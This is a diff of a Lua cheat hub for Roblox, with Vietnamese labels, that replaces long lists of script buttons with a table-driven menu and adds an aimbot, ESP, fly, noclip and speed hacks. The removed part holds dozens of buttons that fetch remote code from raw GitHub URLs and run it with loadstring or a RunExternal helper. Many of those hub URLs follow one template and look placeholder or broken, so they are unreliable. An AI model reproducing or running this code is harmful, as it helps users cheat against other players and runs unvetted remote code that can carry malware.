-   Callback = function()
-       RunExternal("Auto Jump", "https://raw.githubusercontent.com/nguyenphuc888999666-code/Auto-jump-Ph-c/main/Auto%20jump")
-   end,
-})
-
-TabThaiAn:CreateSection("Scripts Admin VIP")
-TabThaiAn:CreateButton({
-   Name = "Infinite Yield (Best Admin)",
-   Callback = function()
-       RunExternal("Inf Yield", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
-   end,
-})
-
-TabThaiAn:CreateButton({
-   Name = "CMD-X Admin",
-   Callback = function()
-       RunExternal("CMD-X", "https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source")
-   end,
-})
-
-TabThaiAn:CreateButton({
-   Name = "Nameless Admin",
-   Callback = function()
-       RunExternal("Nameless Admin", "https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source")
-   end,
-})
-
-TabThaiAn:CreateSection("Tool Hỗ Trợ Dev")
-TabThaiAn:CreateButton({
-   Name = "Dex Explorer (Xem file game)",
-   Callback = function()
-       RunExternal("Dex", "https://raw.githubusercontent.com/infyiff/backup/main/dex.lua")
-   end,
-})
-
-TabThaiAn:CreateButton({
-   Name = "SimpleSpy V2 (Remote Event)",
-   Callback = function()
-       RunExternal("SimpleSpy", "https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua")
-   end,
-})
-
-TabThaiAn:CreateSection("Khác")
-TabThaiAn:CreateButton({
-   Name = "Emote Unlocker (Mở khóa hành động)",
-   Callback = function()
-       RunExternal("Emotes", "https://raw.githubusercontent.com/7yd7/Hub/refs/heads/Branch/GUIS/Emotes.lua")
-   end,
-})
-
-TabThaiAn:CreateButton({
-   Name = "Keyboard Mobile (Bàn phím ảo)",
-   Callback = function()
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivmsjjyt/unp/main/m.lua"))()
-   end,
-})
-
-TabThaiAn:CreateButton({
-   Name = "Hydroxide (Debug Tool)",
-   Callback = function()
-       local owner = "Upbolt"
-       local branch = "revision"
-       local function load(name)
-           loadstring(game:HttpGet(string.format("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua", owner, branch, name)))()
-       end
-       load("init")
-       load("ui/main")
-   end,
-})
-local TabCombat = Window:CreateTab("Aimbot & Visuals", 4483362458)
-
-TabCombat:CreateSection("Aimbot Settings")
-TabCombat:CreateToggle({
-   Name = "Bật Aimbot",
-   CurrentValue = false,
-   Callback = function(Value)
-       getgenv().Aimbot = Value
-   end,
-})
-
-TabCombat:CreateToggle({
-   Name = "Team Check (Không bắn đồng đội)",
-   CurrentValue = false,
-   Callback = function(Value)
-       getgenv().TeamCheck = Value
-   end,
-})
-
-TabCombat:CreateToggle({
-   Name = "Hiển thị vòng FOV",
-   CurrentValue = false,
-   Callback = function(Value)
-       getgenv().ShowFOV = Value
-   end,
-})
-
-TabCombat:CreateSlider({
-   Name = "Phạm vi FOV",
-   Range = {10, 1000},
-   Increment = 1,
-   CurrentValue = 150,
-   Callback = function(Value)
-       getgenv().FOVSize = Value
-   end,
-})
-
-TabCombat:CreateSlider({
-   Name = "Độ mượt (Smoothness)",
-   Range = {0, 1},
-   Increment = 0.1,
-   CurrentValue = 0.2,
-   Callback = function(Value)
-       getgenv().Smoothness = Value
-   end,
-})
-
-TabCombat:CreateDropdown({
-   Name = "Bộ phận nhắm",
-   Options = {"Head", "HumanoidRootPart", "Torso"},
-   CurrentOption = "Head",
-   Callback = function(Option)
-       getgenv().AimPart = Option
-   end,
-})
-
-TabCombat:CreateSection("ESP - X-Ray")
-TabCombat:CreateToggle({
-   Name = "ESP Highlight (Hiện khung màu)",
-   CurrentValue = false,
-   Callback = function(Value)
-       getgenv().ESP_Highlight = Value
-   end,
-})
-
-TabCombat:CreateToggle({
-   Name = "ESP Name (Hiện tên người chơi)",
-   CurrentValue = false,
-   Callback = function(Value)
-       getgenv().ESP_Name = Value
-   end,
-})
-
-TabCombat:CreateToggle({
-   Name = "ESP Tracers (Đường kẻ chỉ hướng)",
-   CurrentValue = false,
-   Callback = function(Value)
-       getgenv().ESP_Tracer = Value
-   end,
-})
-
-local function CreateTracers()
-    for _, v in pairs(game.Players:GetPlayers()) do
-        if v ~= LP and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
-            local line = Drawing.new("Line")
-            line.Visible = false
-            line.Color = Color3.new(1, 1, 1)
-            line.Thickness = 1
-            line.Transparency = 1
-            
-            RunService.RenderStepped:Connect(function()
-                if v.Character and v.Character:FindFirstChild("HumanoidRootPart") and getgenv().ESP_Tracer then
-                    local pos, onScreen = Camera:WorldToViewportPoint(v.Character.HumanoidRootPart.Position)
-                    if onScreen then
-                        line.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
-                        line.To = Vector2.new(pos.X, pos.Y)
-                        line.Visible = true
-                    else
-                        line.Visible = false
-                    end
-                else
-                    line.Visible = false
-                end
-            end)
-        end
+-- Tự động Render Tab từ Database
+for Category, Scripts in pairs(ScriptDB) do
+    local Tab = Window:CreateTab(Category, 4483362458)
+    for _, sc in ipairs(Scripts) do
+        Tab:CreateButton({
+            Name = sc[1],
+            Callback = type(sc[2]) == "function" and sc[2] or function() ExecuteScript(sc[2]) end
+        })
     end
 end
 
-task.spawn(CreateTracers)
+-- ==============================================================================
+-- [ LỚP 3: ENGINE COMBAT V4 & VISUALS & SYSTEM (GỘP VÒNG LẶP) ]
+-- ==============================================================================
+local V4 = {
+    -- Combat
+    Aimbot = false, AimPart = "Head", Smooth = 0.2, WallCheck = false, FOVSize = 150, ShowFOV = false, TeamCheck = false,
+    -- ESP
+    ESP_Highlight = false, ESP_Tracer = false, ESP_Name = false, Skeleton_ESP = false, ViewForward_ESP = false,
+    -- Movement
+    Fly = false, FlySpeed = 50, WalkSpeed = 16, JumpPower = 50, Noclip = false, AntiFling = false,
+    -- Visuals
+    Crosshair = false, Rainbow = false, ShowStats = false
+}
 
-local function GetClosestToMouse()
-    local target = nil
-    local maxDist = getgenv().FOVSize
-    for _, v in pairs(Players:GetPlayers()) do
-        if v ~= LP and v.Character and v.Character:FindFirstChild(getgenv().AimPart) then
-            if getgenv().TeamCheck and v.Team == LP.Team then continue end
-            local pos, onScreen = Camera:WorldToViewportPoint(v.Character[getgenv().AimPart].Position)
-            if onScreen then
-                local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)).Magnitude
-                if dist < maxDist then
-                    maxDist = dist
-                    target = v
-                end
-            end
-        end
+-- TẠO CÁC DRAWING/INSTANCE TRƯỚC VÒNG LẶP
+local FOVCircle = Drawing.new("Circle"); FOVCircle.Color = Color3.new(1,0,0); FOVCircle.Thickness = 1.5; FOVCircle.Filled = false
+local CrossUI = nil
+
+local function CreateLine() local l = Drawing.new("Line"); l.Visible = false; l.Color = Color3.new(1,1,1); l.Thickness = 1.5; return l end
+local ESP_Cache = {}
+
+local TabCombat = Window:CreateTab("V4 Engine (Aim/ESP)", 4483362458)
+TabCombat:CreateToggle({Name = "Bật Aimbot", CurrentValue = false, Callback = function(v) V4.Aimbot = v end})
+TabCombat:CreateToggle({Name = "Wall Check", CurrentValue = false, Callback = function(v) V4.WallCheck = v end})
+TabCombat:CreateToggle({Name = "Hiện FOV", CurrentValue = false, Callback = function(v) V4.ShowFOV = v end})
+TabCombat:CreateSlider({Name = "Độ mượt (Lerp)", Min = 0.1, Max = 1, CurrentValue = 0.2, Callback = function(v) V4.Smooth = v end})
+TabCombat:CreateSlider({Name = "Kích thước FOV", Min = 10, Max = 600, CurrentValue = 150, Callback = function(v) V4.FOVSize = v end})
+TabCombat:CreateSection("ESP Tổng Hợp")
+TabCombat:CreateToggle({Name = "Highlight (Khung)", CurrentValue = false, Callback = function(v) V4.ESP_Highlight = v end})
+TabCombat:CreateToggle({Name = "Name & Distance", CurrentValue = false, Callback = function(v) V4.ESP_Name = v end})
+TabCombat:CreateToggle({Name = "Skeleton ESP", CurrentValue = false, Callback = function(v) V4.Skeleton_ESP = v end})
+
+local TabVisual = Window:CreateTab("V4 Visual & Move", 4483362458)
+TabVisual:CreateToggle({Name = "Custom Crosshair", CurrentValue = false, Callback = function(v)
+    V4.Crosshair = v
+    if v and not CrossUI then
+        CrossUI = Instance.new("ScreenGui", game.CoreGui); CrossUI.Name = "V4Crosshair"
+        local H = Instance.new("Frame", CrossUI); H.Size = UDim2.new(0,18,0,2); H.Position = UDim2.new(0.5,0,0.5,0); H.AnchorPoint = Vector2.new(0.5,0.5); H.BackgroundColor3 = Color3.new(1,0,0); H.BorderSizePixel = 0
+        local V = Instance.new("Frame", CrossUI); V.Size = UDim2.new(0,2,0,18); V.Position = UDim2.new(0.5,0,0.5,0); V.AnchorPoint = Vector2.new(0.5,0.5); V.BackgroundColor3 = Color3.new(1,0,0); V.BorderSizePixel = 0
+    elseif not v and CrossUI then CrossUI:Destroy(); CrossUI = nil end
+end})
+TabVisual:CreateButton({Name = "Tối Ưu FPS Cực Hạn (No Texture)", Callback = function()
+    settings().Network.IncomingReplicationLag = 0
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("BasePart") then v.Material = Enum.Material.Plastic; v.Reflectance = 0
+        elseif v:IsA("Decal") or v:IsA("Texture") then v.Transparency = 1 end
     end
-    return target
+    game.Lighting.GlobalShadows = false
+end})
+TabVisual:CreateToggle({Name = "Bật Fly", CurrentValue = false, Callback = function(v) V4.Fly = v end})
+TabVisual:CreateSlider({Name = "Tốc độ Fly", Min = 10, Max = 500, CurrentValue = 50, Callback = function(v) V4.FlySpeed = v end})
+TabVisual:CreateSlider({Name = "WalkSpeed", Min = 16, Max = 500, CurrentValue = 16, Callback = function(v) V4.WalkSpeed = v end})
+TabVisual:CreateToggle({Name = "Noclip", CurrentValue = false, Callback = function(v) V4.Noclip = v end})
+TabVisual:CreateToggle({Name = "Anti-Fling", CurrentValue = false, Callback = function(v) V4.AntiFling = v end})
+
+-- HÀM RAYCAST WALLCHECK
+local function IsVisible(targetPart)
+    if not V4.WallCheck then return true end
+    local hit = workspace:FindPartOnRayWithIgnoreList(Ray.new(Camera.CFrame.Position, (targetPart.Position - Camera.CFrame.Position).Unit * 1000), {LP.Character, Camera})
+    return hit and hit:IsDescendantOf(targetPart.Parent)
 end
 
-RunService.RenderStepped:Connect(function()
-    FOVCircle.Radius = getgenv().FOVSize
-    FOVCircle.Visible = getgenv().ShowFOV
+-- [ GỘP LOOP 1: RENDER STEPPED DÀNH CHO AIMBOT/ESP/VISUALS ] --
+Services.RunService.RenderStepped:Connect(function()
+    -- 1. FOV
+    FOVCircle.Visible = V4.ShowFOV
+    FOVCircle.Radius = V4.FOVSize
     FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
-    
-    if getgenv().Aimbot then
-        local target = GetClosestToMouse()
-        if target then
-            local pos = Camera:WorldToViewportPoint(target.Character[getgenv().AimPart].Position)
-            local mousePos = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
-            mousemoverel((pos.X - mousePos.X) * getgenv().Smoothness, (pos.Y - mousePos.Y) * getgenv().Smoothness)
+
+    local aimTarget, closest = nil, V4.FOVSize
+
+    -- 2. Duyệt qua Players
+    for _, p in ipairs(Services.Players:GetPlayers()) do
+        if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p.Character:FindFirstChild("Humanoid") and p.Character.Humanoid.Health > 0 then
+            local root = p.Character.HumanoidRootPart
+            local head = p.Character:FindFirstChild("Head")
+            local pos, onScreen = Camera:WorldToViewportPoint(root.Position)
+            
+            -- Aimbot Logic
+            if V4.Aimbot and onScreen and head then
+                if not (V4.TeamCheck and p.Team == LP.Team) then
+                    local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).Magnitude
+                    if dist < closest and IsVisible(head) then closest = dist; aimTarget = head end
+                end
+            end
+
+            -- Quản lý ESP Cache
+            if not ESP_Cache[p] then 
+                ESP_Cache[p] = { text = Drawing.new("Text"), hl = Instance.new("Highlight") } 
+                ESP_Cache[p].text.Size = 16; ESP_Cache[p].text.Center = true; ESP_Cache[p].text.Outline = true; ESP_Cache[p].text.Color = Color3.new(1,1,1)
+            end
+            
+            local esp = ESP_Cache[p]
+            -- Highlight
+            esp.hl.Parent = V4.ESP_Highlight and p.Character or nil
+            if V4.ESP_Highlight then esp.hl.FillColor = Color3.new(1,0,0); esp.hl.OutlineColor = Color3.new(1,1,1) end
+            
+            -- Name ESP
+            if V4.ESP_Name and onScreen then
+                esp.text.Visible = true
+                esp.text.Position = Vector2.new(pos.X, pos.Y - 40)
+                esp.text.Text = p.Name .. " [" .. math.floor((LP.Character.HumanoidRootPart.Position - root.Position).Magnitude) .. "m]"
+            else esp.text.Visible = false end
+        else
+            if ESP_Cache[p] then ESP_Cache[p].text.Visible = false; ESP_Cache[p].hl.Parent = nil end
         end
     end
+
+    -- 3. Aimbot Lock
+    if aimTarget then Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, aimTarget.Position), V4.Smooth) end
 end)
-local TabExtra = Window:CreateTab("Extra Scripts", 4483362458)
 
-TabExtra:CreateButton({
-   Name = "Hoho Hub",
-   Callback = function()
-       RunExternal("Hoho", "https://raw.githubusercontent.com/acsu123/HOHO_HUB/main/Loading_GUI")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Chest Farm",
-   Callback = function()
-       RunExternal("Chest", "https://raw.githubusercontent.com/skid123skidre/skid/main/ChestFarm.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Blacktrap Hub",
-   Callback = function()
-       RunExternal("Blacktrap", "https://raw.githubusercontent.com/Blacktrap?Hub/Main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Fiery Hub",
-   Callback = function()
-       RunExternal("Fiery", "https://raw.githubusercontent.com/Fiery/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Fisrt Hub",
-   Callback = function()
-       RunExternal("Fisrt", "https://raw.githubusercontent.com/Fisrt/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Gura Hub",
-   Callback = function()
-       RunExternal("Gura", "https://raw.githubusercontent.com/Gura/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Hades Hub",
-   Callback = function()
-       RunExternal("Hades", "https://raw.githubusercontent.com/Hades/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Ito Hub",
-   Callback = function()
-       RunExternal("Ito", "https://raw.githubusercontent.com/Ito/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "J9 Hub",
-   Callback = function()
-       RunExternal("J9", "https://raw.githubusercontent.com/J9/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Kaitun Hub",
-   Callback = function()
-       RunExternal("Kaitun", "https://raw.githubusercontent.com/Kaitun/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Kidchi Hub",
-   Callback = function()
-       RunExternal("Kidchi", "https://raw.githubusercontent.com/Kidchi/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Manny Hub",
-   Callback = function()
-       RunExternal("Manny", "https://raw.githubusercontent.com/Manny/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Maru Hub",
-   Callback = function()
-       RunExternal("Maru", "https://raw.githubusercontent.com/Maru/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Min Hub",
-   Callback = function()
-       RunExternal("Min", "https://raw.githubusercontent.com/Min/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Mukuro Hub",
-   Callback = function()
-       RunExternal("Mukuro", "https://raw.githubusercontent.com/Mukuro/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Neva Hub",
-   Callback = function()
-       RunExternal("Neva", "https://raw.githubusercontent.com/Neva/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Nhật Hub",
-   Callback = function()
-       RunExternal("Nhat", "https://raw.githubusercontent.com/Nhat/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Perat Hub",
-   Callback = function()
-       RunExternal("Perat", "https://raw.githubusercontent.com/Perat/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Phantom Hub",
-   Callback = function()
-       RunExternal("Phantom", "https://raw.githubusercontent.com/Phantom/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Playback Hub",
-   Callback = function()
-       RunExternal("Playback", "https://raw.githubusercontent.com/Playback/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Quang Hub",
-   Callback = function()
-       RunExternal("Quang", "https://raw.githubusercontent.com/Quang/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Ripper Hub",
-   Callback = function()
-       RunExternal("Ripper", "https://raw.githubusercontent.com/Ripper/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Sonic Hub",
-   Callback = function()
-       RunExternal("Sonic", "https://raw.githubusercontent.com/Sonic/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "String Hub",
-   Callback = function()
-       RunExternal("String", "https://raw.githubusercontent.com/String/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Tâm Hub",
-   Callback = function()
-       RunExternal("Tam", "https://raw.githubusercontent.com/Tam/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Thái An Hub",
-   Callback = function()
-       RunExternal("ThaiAn", "https://raw.githubusercontent.com/ThaiAn/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Thiên Hub",
-   Callback = function()
-       RunExternal("Thien", "https://raw.githubusercontent.com/Thien/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Tide Hub",
-   Callback = function()
-       RunExternal("Tide", "https://raw.githubusercontent.com/Tide/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Trẩu Hub",
-   Callback = function()
-       RunExternal("Trau", "https://raw.githubusercontent.com/Trau/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Trung Hub",
-   Callback = function()
-       RunExternal("Trung", "https://raw.githubusercontent.com/Trung/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Uranium Hub",
-   Callback = function()
-       RunExternal("Uranium", "https://raw.githubusercontent.com/Uranium/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Vape Hub",
-   Callback = function()
-       RunExternal("Vape", "https://raw.githubusercontent.com/Vape/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Vương Hub",
-   Callback = function()
-       RunExternal("Vuong", "https://raw.githubusercontent.com/Vuong/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "W-Azure Hub",
-   Callback = function()
-       RunExternal("W-Azure", "https://raw.githubusercontent.com/W-Azure/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Xero Hub",
-   Callback = function()
-       RunExternal("Xero", "https://raw.githubusercontent.com/Xero/Hub/main/loader.lua")
-   end,
-})
-
-TabExtra:CreateButton({
-   Name = "Zaque Hub",
-   Callback = function()
-       RunExternal("Zaque", "https://raw.githubusercontent.com/Zaque/Hub/main/loader.lua")
-   end,
-})
-local TabMisc2 = Window:CreateTab("Utility Hubs", 4483362458)
-
-TabMisc2:CreateButton({
-   Name = "Zon Hub",
-   Callback = function()
-       RunExternal("Zon", "https://raw.githubusercontent.com/Zon/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Anz Hub",
-   Callback = function()
-       RunExternal("Anz", "https://raw.githubusercontent.com/Anz/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Bắp Hub",
-   Callback = function()
-       RunExternal("Bap", "https://raw.githubusercontent.com/Bap/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Bông Hub",
-   Callback = function()
-       RunExternal("Bong", "https://raw.githubusercontent.com/Bong/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Byn Hub",
-   Callback = function()
-       RunExternal("Byn", "https://raw.githubusercontent.com/Byn/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Cáo Hub",
-   Callback = function()
-       RunExternal("Cao", "https://raw.githubusercontent.com/Cao/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Chuối Hub",
-   Callback = function()
-       RunExternal("Chuoi", "https://raw.githubusercontent.com/Chuoi/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Dâu Hub",
-   Callback = function()
-       RunExternal("Dau", "https://raw.githubusercontent.com/Dau/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Dưa Hub",
-   Callback = function()
-       RunExternal("Dua", "https://raw.githubusercontent.com/Dua/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Hà Hub",
-   Callback = function()
-       RunExternal("Ha", "https://raw.githubusercontent.com/Ha/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Hạnh Hub",
-   Callback = function()
-       RunExternal("Hanh", "https://raw.githubusercontent.com/Hanh/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Hổ Hub",
-   Callback = function()
-       RunExternal("Ho", "https://raw.githubusercontent.com/Ho/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Hồng Hub",
-   Callback = function()
-       RunExternal("Hong", "https://raw.githubusercontent.com/Hong/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Hùng Hub",
-   Callback = function()
-       RunExternal("Hung", "https://raw.githubusercontent.com/Hung/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Huy Hub",
-   Callback = function()
-       RunExternal("Huy", "https://raw.githubusercontent.com/Huy/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Khoa Hub",
-   Callback = function()
-       RunExternal("Khoa", "https://raw.githubusercontent.com/Khoa/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Kiệt Hub",
-   Callback = function()
-       RunExternal("Kiet", "https://raw.githubusercontent.com/Kiet/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Lâm Hub",
-   Callback = function()
-       RunExternal("Lam", "https://raw.githubusercontent.com/Lam/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Lân Hub",
-   Callback = function()
-       RunExternal("Lan", "https://raw.githubusercontent.com/Lan/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Linh Hub",
-   Callback = function()
-       RunExternal("Linh", "https://raw.githubusercontent.com/Linh/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Lộc Hub",
-   Callback = function()
-       RunExternal("Loc", "https://raw.githubusercontent.com/Loc/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Long Hub",
-   Callback = function()
-       RunExternal("Long", "https://raw.githubusercontent.com/Long/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Mạnh Hub",
-   Callback = function()
-       RunExternal("Manh", "https://raw.githubusercontent.com/Manh/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Minh Hub",
-   Callback = function()
-       RunExternal("Minh", "https://raw.githubusercontent.com/Minh/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Nam Hub",
-   Callback = function()
-       RunExternal("Nam", "https://raw.githubusercontent.com/Nam/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Nga Hub",
-   Callback = function()
-       RunExternal("Nga", "https://raw.githubusercontent.com/Nga/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Ngọc Hub",
-   Callback = function()
-       RunExternal("Ngoc", "https://raw.githubusercontent.com/Ngoc/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Nhân Hub",
-   Callback = function()
-       RunExternal("Nhan", "https://raw.githubusercontent.com/Nhan/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Nhi Hub",
-   Callback = function()
-       RunExternal("Nhi", "https://raw.githubusercontent.com/Nhi/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Nhung Hub",
-   Callback = function()
-       RunExternal("Nhung", "https://raw.githubusercontent.com/Nhung/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Phúc Hub",
-   Callback = function()
-       RunExternal("Phuc", "https://raw.githubusercontent.com/Phuc/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Phương Hub",
-   Callback = function()
-       RunExternal("Phuong", "https://raw.githubusercontent.com/Phuong/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Quân Hub",
-   Callback = function()
-       RunExternal("Quan", "https://raw.githubusercontent.com/Quan/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Quốc Hub",
-   Callback = function()
-       RunExternal("Quoc", "https://raw.githubusercontent.com/Quoc/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Sơn Hub",
-   Callback = function()
-       RunExternal("Son", "https://raw.githubusercontent.com/Son/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc2:CreateButton({
-   Name = "Tài Hub",
-   Callback = function()
-       RunExternal("Tai", "https://raw.githubusercontent.com/Tai/Hub/main/loader.lua")
-   end,
-})
-local TabMisc3 = Window:CreateTab("Global Scripts", 4483362458)
-
-TabMisc3:CreateButton({
-   Name = "Thắng Hub",
-   Callback = function()
-       RunExternal("Thang", "https://raw.githubusercontent.com/Thang/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Thành Hub",
-   Callback = function()
-       RunExternal("Thanh", "https://raw.githubusercontent.com/Thanh/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Thảo Hub",
-   Callback = function()
-       RunExternal("Thao", "https://raw.githubusercontent.com/Thao/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Thế Hub",
-   Callback = function()
-       RunExternal("The", "https://raw.githubusercontent.com/The/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Thịnh Hub",
-   Callback = function()
-       RunExternal("Thinh", "https://raw.githubusercontent.com/Thinh/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Thọ Hub",
-   Callback = function()
-       RunExternal("Tho", "https://raw.githubusercontent.com/Tho/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Thông Hub",
-   Callback = function()
-       RunExternal("Thong", "https://raw.githubusercontent.com/Thong/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Thu Hub",
-   Callback = function()
-       RunExternal("Thu", "https://raw.githubusercontent.com/Thu/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Thủy Hub",
-   Callback = function()
-       RunExternal("Thuy", "https://raw.githubusercontent.com/Thuy/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Tiến Hub",
-   Callback = function()
-       RunExternal("Tien", "https://raw.githubusercontent.com/Tien/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Trâm Hub",
-   Callback = function()
-       RunExternal("Tram", "https://raw.githubusercontent.com/Tram/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Trang Hub",
-   Callback = function()
-       RunExternal("Trang", "https://raw.githubusercontent.com/Trang/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Triển Hub",
-   Callback = function()
-       RunExternal("Trien", "https://raw.githubusercontent.com/Trien/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Triết Hub",
-   Callback = function()
-       RunExternal("Triet", "https://raw.githubusercontent.com/Triet/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Triệu Hub",
-   Callback = function()
-       RunExternal("Trieu", "https://raw.githubusercontent.com/Trieu/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Trinh Hub",
-   Callback = function()
-       RunExternal("Trinh", "https://raw.githubusercontent.com/Trinh/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Trọng Hub",
-   Callback = function()
